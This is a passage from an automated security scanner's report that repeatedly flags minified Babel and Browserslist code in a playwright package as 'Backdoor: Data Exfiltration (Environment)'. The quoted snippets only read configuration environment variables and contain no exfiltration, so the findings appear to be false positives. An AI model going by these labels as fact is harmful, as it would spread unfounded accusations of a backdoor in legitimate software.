          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1744,
                  "startColumn": 2880,
                  "endLine": 1744,
                  "endColumn": 2914,
                  "snippet": {
                    "text": "s[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Assertion failure - missing override\");let u=(o=l.env)==null?void 0:o[i];return u?n(e,u,`${r}.overrides[${s}].env[\"${i}\"]`):null}function xb({root:e,env:t,overrides:r,overridesEnv:n,createLogger:s}){return function*(a,o,l=new Set,u){let{dirname:c}=a,f=[],p=e(a);if(Af(p,c,o,a.filepath)){f.push({config:p,envName:void 0,index:void 0});let d=t(a,o.envName);d&&Af(d,c,o,a.filepath)&&f.push({config:d,envName:o.envName,index:void 0}),(p.options.overrides||[]).forEach((y,v)=>{let I=r(a,v);if(Af(I,c,o,a.filepath)){",
                    "rendered": {
                      "text": "s[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Assertion failure - missing override\");let u=(o=l.env)==null?void 0:o[i];return u?n(e,u,`${r}.overrides[${s}].env[\"${i}\"]`):null}function xb({root:e,env:t,overrides:r,overridesEnv:n,createLogger:s}){return function*(a,o,l=new Set,u){let{dirname:c}=a,f=[],p=e(a);if(Af(p,c,o,a.filepath)){f.push({config:p,envName:void 0,index:void 0});let d=t(a,o.envName);d&&Af(d,c,o,a.filepath)&&f.push({config:d,envName:o.envName,index:void 0}),(p.options.overrides||[]).forEach((y,v)=>{let I=r(a,v);if(Af(I,c,o,a.filepath)){",
                      "markdown": "`s[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Assertion failure - missing override\");let u=(o=l.env)==null?void 0:o[i];return u?n(e,u,`${r}.overrides[${s}].env[\"${i}\"]`):null}function xb({root:e,env:t,overrides:r,overridesEnv:n,createLogger:s}){return function*(a,o,l=new Set,u){let{dirname:c}=a,f=[],p=e(a);if(Af(p,c,o,a.filepath)){f.push({config:p,envName:void 0,index:void 0});let d=t(a,o.envName);d&&Af(d,c,o,a.filepath)&&f.push({config:d,envName:o.envName,index:void 0}),(p.options.overrides||[]).forEach((y,v)=>{let I=r(a,v);if(Af(I,c,o,a.filepath)){`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1744,
                  "startColumn": 2814,
                  "endLine": 1744,
                  "endColumn": 2837,
                  "snippet": {
                    "text": "Assertion failure - missing override\");return n(e,a,`${r}.overrides[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Assertion failure - missing override\");let u=(o=l.env)==null?void 0:o[i];return u?n(e,u,`${r}.overrides[${s}].env[\"${i}\"]`):null}function xb({root:e,env:t,overrides:r,overridesEnv:n,createLogger:s}){return function*(a,o,l=new Set,u){let{dirname:c}=a,f=[],p=e(a);if(Af(p,c,o,a.filepath)){f.push({config:p,envName:void 0,index:void 0});let d=t(a,o.envName);d&&Af(d,c,o,a.filepath)&&f.push({config:d,envName:o.envName,index:void 0}),(p.",
                    "rendered": {
                      "text": "Assertion failure - missing override\");return n(e,a,`${r}.overrides[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Assertion failure - missing override\");let u=(o=l.env)==null?void 0:o[i];return u?n(e,u,`${r}.overrides[${s}].env[\"${i}\"]`):null}function xb({root:e,env:t,overrides:r,overridesEnv:n,createLogger:s}){return function*(a,o,l=new Set,u){let{dirname:c}=a,f=[],p=e(a);if(Af(p,c,o,a.filepath)){f.push({config:p,envName:void 0,index:void 0});let d=t(a,o.envName);d&&Af(d,c,o,a.filepath)&&f.push({config:d,envName:o.envName,index:void 0}),(p.",
                      "markdown": "`Assertion failure - missing override\");return n(e,a,`${r}.overrides[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Assertion failure - missing override\");let u=(o=l.env)==null?void 0:o[i];return u?n(e,u,`${r}.overrides[${s}].env[\"${i}\"]`):null}function xb({root:e,env:t,overrides:r,overridesEnv:n,createLogger:s}){return function*(a,o,l=new Set,u){let{dirname:c}=a,f=[],p=e(a);if(Af(p,c,o,a.filepath)){f.push({config:p,envName:void 0,index:void 0});let d=t(a,o.envName);d&&Af(d,c,o,a.filepath)&&f.push({config:d,envName:o.envName,index:void 0}),(p.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1744,
                  "startColumn": 2385,
                  "endLine": 1744,
                  "endColumn": 2408,
                  "snippet": {
                    "text": "nction Eb({dirname:e,options:t},r,n){return n(e,t,r)}function s0e(e,t,r){var n;return r?r.configure(t.showConfig,fl.ChainFormatter.Programmatic,{callerName:(n=t.caller)==null?void 0:n.name}):()=>{}}function vb({dirname:e,options:t},r,n,s){var i;let a=(i=t.env)==null?void 0:i[s];return a?n(e,a,`${r}.env[\"${s}\"]`):null}function Tb({dirname:e,options:t},r,n,s){var i;let a=(i=t.overrides)==null?void 0:i[s];if(!a)throw new Error(\"Assertion failure - missing override\");return n(e,a,`${r}.overrides[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Asse",
                    "rendered": {
                      "text": "nction Eb({dirname:e,options:t},r,n){return n(e,t,r)}function s0e(e,t,r){var n;return r?r.configure(t.showConfig,fl.ChainFormatter.Programmatic,{callerName:(n=t.caller)==null?void 0:n.name}):()=>{}}function vb({dirname:e,options:t},r,n,s){var i;let a=(i=t.env)==null?void 0:i[s];return a?n(e,a,`${r}.env[\"${s}\"]`):null}function Tb({dirname:e,options:t},r,n,s){var i;let a=(i=t.overrides)==null?void 0:i[s];if(!a)throw new Error(\"Assertion failure - missing override\");return n(e,a,`${r}.overrides[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Asse",
                      "markdown": "`nction Eb({dirname:e,options:t},r,n){return n(e,t,r)}function s0e(e,t,r){var n;return r?r.configure(t.showConfig,fl.ChainFormatter.Programmatic,{callerName:(n=t.caller)==null?void 0:n.name}):()=>{}}function vb({dirname:e,options:t},r,n,s){var i;let a=(i=t.env)==null?void 0:i[s];return a?n(e,a,`${r}.env[\"${s}\"]`):null}function Tb({dirname:e,options:t},r,n,s){var i;let a=(i=t.overrides)==null?void 0:i[s];if(!a)throw new Error(\"Assertion failure - missing override\");return n(e,a,`${r}.overrides[${s}]`)}function Sb({dirname:e,options:t},r,n,s,i){var a,o;let l=(a=t.overrides)==null?void 0:a[s];if(!l)throw new Error(\"Asse`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1732,
                  "startColumn": 13174,
                  "endLine": 1732,
                  "endColumn": 13212,
                  "snippet": {
                    "text": "eMaps, cannot use both\")}function _ye(e,t){if(e.parent.type===\"env\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside of another .env block`);let r=e.parent,n=(0,ge.assertObject)(e,t);if(n)for(let s of Object.keys(n)){let i=(0,ge.assertObject)((0,ge.access)(e,s),n[s]);if(!i)continue;ob({type:\"env\",name:s,parent:r},i)}return n}function Nye(e,t){if(e.parent.type===\"env\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside an .env block`);if(e.parent.type===\"overrides\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside an .overrides block`);let r=e.parent,n=(0,ge.assertArray)(e,t);if(n)for(let[s,i]of n.entries()){let a=",
                    "rendered": {
                      "text": "eMaps, cannot use both\")}function _ye(e,t){if(e.parent.type===\"env\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside of another .env block`);let r=e.parent,n=(0,ge.assertObject)(e,t);if(n)for(let s of Object.keys(n)){let i=(0,ge.assertObject)((0,ge.access)(e,s),n[s]);if(!i)continue;ob({type:\"env\",name:s,parent:r},i)}return n}function Nye(e,t){if(e.parent.type===\"env\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside an .env block`);if(e.parent.type===\"overrides\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside an .overrides block`);let r=e.parent,n=(0,ge.assertArray)(e,t);if(n)for(let[s,i]of n.entries()){let a=",
                      "markdown": "`eMaps, cannot use both\")}function _ye(e,t){if(e.parent.type===\"env\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside of another .env block`);let r=e.parent,n=(0,ge.assertObject)(e,t);if(n)for(let s of Object.keys(n)){let i=(0,ge.assertObject)((0,ge.access)(e,s),n[s]);if(!i)continue;ob({type:\"env\",name:s,parent:r},i)}return n}function Nye(e,t){if(e.parent.type===\"env\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside an .env block`);if(e.parent.type===\"overrides\")throw new Error(`${(0,ge.msg)(e)} is not allowed inside an .overrides block`);let r=e.parent,n=(0,ge.assertArray)(e,t);if(n)for(let[s,i]of n.entries()){let a=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1731,
                  "startColumn": 460,
                  "endLine": 1731,
                  "endColumn": 511,
                  "snippet": {
                    "text": "eturn[\"node\",e===!0||e===\"current\"?process.versions.node:$D(\"node\",e)]}function qme(e,t){let r=(0,an.isUnreleasedVersion)(t,e)?t.toLowerCase():$D(e,t);return[e,r]}function Ume(e){let t=Object.assign({},e);return delete t.esmodules,delete t.browsers,t}function Vme(e,t){let r=MD(e,{mobileToDesktop:!0,env:t});return Lme(r)}var LD=new Nme({max:64});function $me(e,t){let r=typeof e==\"string\"?e:e.join()+t,n=LD.get(r);return n||(n=Vme(e,t),LD.set(r,n)),Object.assign({},n)}function Wme(e={},t={}){var r,n;let{browsers:s,esmodules:i}=e,{configPath:a=\".\"}=t;jme(s);let o=Ume(e),l=Fme(o),c=!!s||Object.keys(l).length>0,f=!t.ignoreBrowserslistConfig&&!c;if(!",
                    "rendered": {
                      "text": "eturn[\"node\",e===!0||e===\"current\"?process.versions.node:$D(\"node\",e)]}function qme(e,t){let r=(0,an.isUnreleasedVersion)(t,e)?t.toLowerCase():$D(e,t);return[e,r]}function Ume(e){let t=Object.assign({},e);return delete t.esmodules,delete t.browsers,t}function Vme(e,t){let r=MD(e,{mobileToDesktop:!0,env:t});return Lme(r)}var LD=new Nme({max:64});function $me(e,t){let r=typeof e==\"string\"?e:e.join()+t,n=LD.get(r);return n||(n=Vme(e,t),LD.set(r,n)),Object.assign({},n)}function Wme(e={},t={}){var r,n;let{browsers:s,esmodules:i}=e,{configPath:a=\".\"}=t;jme(s);let o=Ume(e),l=Fme(o),c=!!s||Object.keys(l).length>0,f=!t.ignoreBrowserslistConfig&&!c;if(!",
                      "markdown": "`eturn[\"node\",e===!0||e===\"current\"?process.versions.node:$D(\"node\",e)]}function qme(e,t){let r=(0,an.isUnreleasedVersion)(t,e)?t.toLowerCase():$D(e,t);return[e,r]}function Ume(e){let t=Object.assign({},e);return delete t.esmodules,delete t.browsers,t}function Vme(e,t){let r=MD(e,{mobileToDesktop:!0,env:t});return Lme(r)}var LD=new Nme({max:64});function $me(e,t){let r=typeof e==\"string\"?e:e.join()+t,n=LD.get(r);return n||(n=Vme(e,t),LD.set(r,n)),Object.assign({},n)}function Wme(e={},t={}){var r,n;let{browsers:s,esmodules:i}=e,{configPath:a=\".\"}=t;jme(s);let o=Ume(e),l=Fme(o),c=!!s||Object.keys(l).length>0,f=!t.ignoreBrowserslistConfig&&!c;if(!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1725,
                  "startColumn": 4926,
                  "endLine": 1725,
                  "endColumn": 4976,
                  "snippet": {
                    "text": "typeof e==\"string\"||Array.isArray(e)))throw new xr(\"Browser queries must be an array or string. Got \"+typeof e+\".\")}var Lg={};function Ee(e,t){t=nD(t),e=sD(e,t),iD(e);var r={ignoreUnknownVersions:t.ignoreUnknownVersions,dangerousExtend:t.dangerousExtend,mobileToDesktop:t.mobileToDesktop,path:t.path,env:t.env};sr.oldDataWarning(Ee.data);var n=sr.getStat(t,Ee.data);if(n){r.customUsage={};for(var s in n)uf(r.customUsage,s,n[s])}var i=JSON.stringify([e,r]);if(Lg[i])return Lg[i];var a=tD(ma(e,r)).sort(function(o,l){if(o=o.split(\" \"),l=l.split(\" \"),o[0]===l[0]){var u=o[1].split(\"-\")[0],c=l[1].split(\"-\")[0];return Qo(c.split(\".\"),u.split(\".\"))}else ",
                    "rendered": {
                      "text": "typeof e==\"string\"||Array.isArray(e)))throw new xr(\"Browser queries must be an array or string. Got \"+typeof e+\".\")}var Lg={};function Ee(e,t){t=nD(t),e=sD(e,t),iD(e);var r={ignoreUnknownVersions:t.ignoreUnknownVersions,dangerousExtend:t.dangerousExtend,mobileToDesktop:t.mobileToDesktop,path:t.path,env:t.env};sr.oldDataWarning(Ee.data);var n=sr.getStat(t,Ee.data);if(n){r.customUsage={};for(var s in n)uf(r.customUsage,s,n[s])}var i=JSON.stringify([e,r]);if(Lg[i])return Lg[i];var a=tD(ma(e,r)).sort(function(o,l){if(o=o.split(\" \"),l=l.split(\" \"),o[0]===l[0]){var u=o[1].split(\"-\")[0],c=l[1].split(\"-\")[0];return Qo(c.split(\".\"),u.split(\".\"))}else ",
                      "markdown": "`typeof e==\"string\"||Array.isArray(e)))throw new xr(\"Browser queries must be an array or string. Got \"+typeof e+\".\")}var Lg={};function Ee(e,t){t=nD(t),e=sD(e,t),iD(e);var r={ignoreUnknownVersions:t.ignoreUnknownVersions,dangerousExtend:t.dangerousExtend,mobileToDesktop:t.mobileToDesktop,path:t.path,env:t.env};sr.oldDataWarning(Ee.data);var n=sr.getStat(t,Ee.data);if(n){r.customUsage={};for(var s in n)uf(r.customUsage,s,n[s])}var i=JSON.stringify([e,r]);if(Lg[i])return Lg[i];var a=tD(ma(e,r)).sort(function(o,l){if(o=o.split(\" \"),l=l.split(\" \"),o[0]===l[0]){var u=o[1].split(\"-\")[0],c=l[1].split(\"-\")[0];return Qo(c.split(\".\"),u.split(\".\"))}else `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 61837,
                  "endLine": 1723,
                  "endColumn": 61883,
                  "snippet": {
                    "text": "list and package.json with browsers\");if(Tn(o)&&l)throw new nr(s+\" contains both .browserslistrc and package.json with browsers\");if(Tn(i)&&Tn(o))throw new nr(s+\" contains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@",
                    "rendered": {
                      "text": "list and package.json with browsers\");if(Tn(o)&&l)throw new nr(s+\" contains both .browserslistrc and package.json with browsers\");if(Tn(i)&&Tn(o))throw new nr(s+\" contains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@",
                      "markdown": "`list and package.json with browsers\");if(Tn(o)&&l)throw new nr(s+\" contains both .browserslistrc and package.json with browsers\");if(Tn(i)&&Tn(o))throw new nr(s+\" contains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59229,
                  "endLine": 1723,
                  "endColumn": 59250,
                  "snippet": {
                    "text": "angerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path",
                    "rendered": {
                      "text": "angerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path",
                      "markdown": "`angerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 58051,
                  "endLine": 1723,
                  "endColumn": 58101,
                  "snippet": {
                    "text": "Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browserslist)throw new nr(\"`browserlist` key instead of `browserslist` in \"+e);var r=t.browserslist;(Array.isArray(r)||typeof r==\"string\")&&(r={defaults:r});for(var n in r)Yhe(r[n]);return r}functi",
                    "rendered": {
                      "text": "Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browserslist)throw new nr(\"`browserlist` key instead of `browserslist` in \"+e);var r=t.browserslist;(Array.isArray(r)||typeof r==\"string\")&&(r={defaults:r});for(var n in r)Yhe(r[n]);return r}functi",
                      "markdown": "`Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browserslist)throw new nr(\"`browserlist` key instead of `browserslist` in \"+e);var r=t.browserslist;(Array.isArray(r)||typeof r==\"string\")&&(r={defaults:r});for(var n in r)Yhe(r[n]);return r}functi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 57423,
                  "endLine": 1723,
                  "endColumn": 57471,
                  "snippet": {
                    "text": "[^/]+\\//,\"\").indexOf(\".\")!==-1)throw new nr(\"`.` not allowed in Browserslist config name. \"+t);if(e.indexOf(\"node_modules\")!==-1)throw new nr(\"`node_modules` not allowed in Browserslist config.\"+t)}function Tn(e){if(e in tf)return tf[e];var t=da.existsSync(e)&&da.statSync(e).isFile();return process.env.BROWSERSLIST_DISABLE_CACHE||(tf[e]=t),t}function qw(e,t){var r=Tn(e)?rn.dirname(e):e,n=rn.resolve(r);do{var s=t(n);if(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t)",
                    "rendered": {
                      "text": "[^/]+\\//,\"\").indexOf(\".\")!==-1)throw new nr(\"`.` not allowed in Browserslist config name. \"+t);if(e.indexOf(\"node_modules\")!==-1)throw new nr(\"`node_modules` not allowed in Browserslist config.\"+t)}function Tn(e){if(e in tf)return tf[e];var t=da.existsSync(e)&&da.statSync(e).isFile();return process.env.BROWSERSLIST_DISABLE_CACHE||(tf[e]=t),t}function qw(e,t){var r=Tn(e)?rn.dirname(e):e,n=rn.resolve(r);do{var s=t(n);if(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t)",
                      "markdown": "`[^/]+\\//,\"\").indexOf(\".\")!==-1)throw new nr(\"`.` not allowed in Browserslist config name. \"+t);if(e.indexOf(\"node_modules\")!==-1)throw new nr(\"`node_modules` not allowed in Browserslist config.\"+t)}function Tn(e){if(e in tf)return tf[e];var t=da.existsSync(e)&&da.statSync(e).isFile();return process.env.BROWSERSLIST_DISABLE_CACHE||(tf[e]=t),t}function qw(e,t){var r=Tn(e)?rn.dirname(e):e,n=rn.resolve(r);do{var s=t(n);if(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 688,
                  "endLine": 1723,
                  "endColumn": 739,
                  "snippet": {
                    "text": "fined\"?s.envName:typeof n==\"function\"?(0,ew.assertSimpleType)(n(s.envName)):(Array.isArray(n)?n:[n]).some(i=>{if(typeof i!=\"string\")throw new Error(\"Unexpected non-string value\");return i===s.envName})),r=n=>e.using(s=>(0,ew.assertSimpleType)(n(s.caller)));return{version:Hc.version,cache:e.simple(),env:t,async:()=>!1,caller:r,assertVersion:whe}}function nw(e,t){let r=()=>JSON.parse(e.using(s=>JSON.stringify(s.targets))),n=s=>{t.push(s)};return Object.assign({},rw(e),{targets:r,addExternalDependency:n})}function Che(e,t){let r=n=>e.using(s=>s.assumptions[n]);return Object.assign({},nw(e,t),{assumption:r})}function whe(e){if(typeof e==\"number\"){",
                    "rendered": {
